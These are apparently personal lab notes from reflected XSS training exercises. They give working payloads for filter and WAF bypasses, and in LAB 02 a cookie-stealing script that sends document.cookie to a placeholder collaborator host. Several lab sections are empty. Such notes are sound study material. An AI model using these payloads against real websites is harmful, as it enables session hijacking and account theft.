# Reflected XSS

Reflect directly to the user.

## LAB 00: **Reflected XSS into a *template literal* with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

Real case from H1: 

[Ruby on Rails disclosed on HackerOne: XSS due to incomplete JS...](https://hackerone.com/reports/474262)

Quick test: [https://www.w3schools.com/JS//tryit.asp?filename=tryjs_templates_html](https://www.w3schools.com/JS//tryit.asp?filename=tryjs_templates_html)

### Overall

The blog is vulnerable to XSS at function search for the topic name or content of the topic that appear the search string.

Looking from the raw response return from the server we noted that the search string been Unicode-encoded. 

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled.png)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%201.png)

Testing with some special characters & noted that { } $ - / are not encoded, which we may think a way to use these character to craft the payload that may cause XSS to the blog.

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%202.png)

### Step to reproduce

At this step, we already know that there are still some special characters that the blog not Unicode-encoded. 

Read through the script snippet code that that build and output the result to the front-end, we may note that everything come to the search bar will be handle and process then put in the single quote pair inside the back ticks pair to craft a result. 

Proved by input a space in the search string below.

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%203.png)

In this case, we want to look into the **HTML Templates** or **Template Literals** in general. View appendix for more information.

**In this case, the string is crafted in the back ticks pair, a form of template literals and then put the string user want to search inside that pair of back ticks.** 

At this point, we want to read through this topic about [nesting template](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#nesting_templates) which is a way to help developer easier to craft the string using in JS. And combine with the noted that we already gathered in the Overall which is the blog allow $ { } to go through.

Proved the theory, JS is executed inside the string crafted by developer himself or even by append the html tags, this JS expression still performs its work inside the ${}, which cause the XSS to happened.

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%204.png)

PAYLOAD: 

```jsx
${alert(1)}
```

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%205.png)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%206.png)

Payload successfully go directly to the string causing XSS to the blog.

### Mitigation

**escaping `$` with `\$`**

**Filter input on arrival**

**Encode data on output**

### Appendix

sample payload

[XSS with Template Literals](https://security.stackexchange.com/questions/241016/xss-with-template-literals)

[XSS Security with string templates?](https://www.sitepoint.com/community/t/xss-security-with-string-templates/384340)

[Is there XSS risk when using a template literal with an untrusted string to set an attribute value?](https://stackoverflow.com/questions/64959723/is-there-xss-risk-when-using-a-template-literal-with-an-untrusted-string-to-set)

Knowledge about template strings that may help in reproduce the exploitation.

[JavaScript Template Literals](https://www.w3schools.com/JS//js_string_templates.asp)

[Template literals (Template strings) - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)

## LAB 01: Reflected XSS into HTML context with nothing encoded

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%207.png)

Direct pass untrusted data to BE and output directly to the FE, test with h6 tag,…

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%208.png)

PAYLOAD: 

```jsx
<script>prompt("hello");</script> 
```

## LAB 02: ****Exploiting cross-site scripting to steal cookies****

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%209.png)

Inject h1 tag in comment, the code accept and execute the code to the FE, pass through the p tag → can inject JS code into comment field

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2010.png)

PAYLOAD: 

```jsx
<script>document.location = "https://[burpCollaboratorURL]?cookies=" + document.cookie;</script>
```

## LAB 03: ****Exploiting cross-site scripting to capture passwords****

## LAB 04: Reflected XSS into HTML context with most tags and attributes blocked

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2011.png)

WAF being used. → bypass WAF with payload that can inject JS into h1 field

Scan with live scan 

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2012.png)

So we need to inject some kind of html tag that the WAF allowed.

Intruder brute-force for tag and attribute that allowed by WAF, then put print() in attribute.

PAYLOAD: 

```jsx
search=%22%3E%3Cbody%20onresize=print()%3E
```

[Alternative to iFrames in HTML5 - GeeksforGeeks](https://www.geeksforgeeks.org/alternative-to-iframes-in-html5/)

## ****LAB 05: Reflected XSS into HTML context with all tags blocked except custom ones****

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2013.png)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2014.png)

Custom a new tag, seem it can go through the WAF.

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2015.png)

PAYLOAD: 

```jsx

```

## LAB 06: ****Reflected XSS into attribute with angle brackets HTML-encoded****

## LAB 07: ****Reflected XSS in canonical link tag****

[XSS in hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields)

[accesskey - HTML&colon; HyperText Markup Language | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey)

[HTML accesskey Attribute](https://www.w3schools.com/TAGS/att_global_accesskey.asp)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2016.png)

Normal GET package from website, but we can inject a new attribute right in the link of the header and introduce a new attribute in the same link tag.

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2017.png)

PAYLOAD: 

```jsx
/?%27accesskey=%27x%27onclick=%27alert(1)
```

## LAB 08: **Reflected XSS into a JavaScript string with single quote and backslash escaped**

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2018.png)

Vulnerable script tag code escape the script tag and start a new script tag to inject the malicious code

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2019.png)

PAYLOAD: 

```jsx
</script><script>alert(1)</script>
```

## LAB 09: **Reflected XSS into a JavaScript string with angle brackets HTML encoded**

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2020.png)

Similar to the above lab, but this time we want to inject the malicious code inside the single quote by enclosing it in 2 side, this make the payload as same as the above lab but still follow the logic of the original code.

PAYLOAD:

 

```jsx
''-alert(1);-'' || ';alert(document.domain)//
```

## LAB 10: **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2021.png)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2022.png)

Because angle brackets are encoded, so basically we need to find the way to run the payload the same way as the above lab, but at this time single quotes are escaped by \ but while we add 1 more \ before the payload, the Payload can execute due to the header of the payload try to escape and make the code executable, then the footer of the payload try to comment out the rest quote.

```jsx
\'-prompt(1);-// || \'-prompt(1);-//' || \'-prompt(1);//'
```

## LAB 11: ****Reflected XSS in a JavaScript URL with some characters blocked****

[http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)

[XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

## LAB 13: Reflected XSS with some SVG markup allowed

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2023.png)

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2024.png)

Allowed events & attributes

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2025.png)

```jsx
<svg><animatetransform onbegin=alert(1)></svg>
```

## ****LAB 14: Reflected XSS with event handlers and `href` attributes blocked**

![Untitled](Reflected%20XSS%206579ade954e9409aba5dc0b497c2c3a7/Untitled%2026.png)

Allowed tags, none attribute. Combining 

```jsx
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```